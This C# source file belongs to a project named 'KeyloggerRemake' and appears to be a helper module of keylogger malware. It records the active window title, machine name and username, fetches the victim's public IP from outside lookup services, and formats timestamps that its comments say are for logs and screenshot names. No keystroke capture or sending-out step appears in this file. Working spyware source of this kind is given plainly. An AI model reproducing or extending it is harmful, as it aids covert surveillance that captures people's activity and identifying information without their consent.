using System;
using System.Windows.Forms;
using System.Text;
using System.Net;
using System.Runtime.InteropServices;

namespace KeyloggerRemake
{
    static class classGetUserInfo
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow(); //Used to get the active window

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count); //Used to get the window title

        public static string strCurrentWindow = "";

        //Gets the current window title
        public static String getActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow(); //Gets the window

            if (GetWindowText(handle, Buff, nChars) > 0) //Uses the window to get its title and sets it to the variable
            {
                return Buff.ToString(); //Returns the window title
            }
            return null;
        }

        //To get user's info
        public static string getUserInfo()
        {
            string info = Environment.NewLine + "Computer Name:" + " " + Environment.MachineName + Environment.NewLine
                 + "Username:" + " " + Environment.UserName + Environment.NewLine
                 + "IP: " + getIPAddress();

            return info;
        }

        //To get user's IP address
        public static string getIPAddress()
        {
            string strIP = "";

            string ipAPI1 = "https://api.ipify.org/";
            string ipAPI2 = "https://ip.seeip.org/";
            string ipAPI3 = "https://api.ip.sb/ip";

            using (WebClient wc = new WebClient())
            {
                try
                {
                    strIP = System.Text.Encoding.UTF8.GetString(wc.DownloadData(ipAPI1));
                }
                catch (WebException) //If API1 doesn't work
                {
                    strIP = System.Text.Encoding.UTF8.GetString(wc.DownloadData(ipAPI2));
                }
                catch //If API2 doesn't work
                {
                    try
                    {
                        strIP = System.Text.Encoding.UTF8.GetString(wc.DownloadData(ipAPI3));
                    }
                    catch (WebException) //If API3 doesn't work
                    {
                        strIP = "Unresolvable, APIs down";
                        throw new Exception("IP can't be obtained");
                    }
                }
            }

            return strIP;
        }

        //Gets the long date and time for the log
        public static String getDateAndTime()
        {
            return (DateTime.Now.DayOfWeek.ToString() + ", " + DateTime.Now.ToLongDateString() + " "
                + DateTime.Now.ToLongTimeString() + " ");
        }

        //Gets short current date and time for the log and screenshot names
        public static String getShortDTime()
        {
            return (DateTime.Now.ToShortDateString() + " "
                + DateTime.Now.ToShortTimeString()).Replace(":", "-").Replace("/", "-");
        }
    }
}
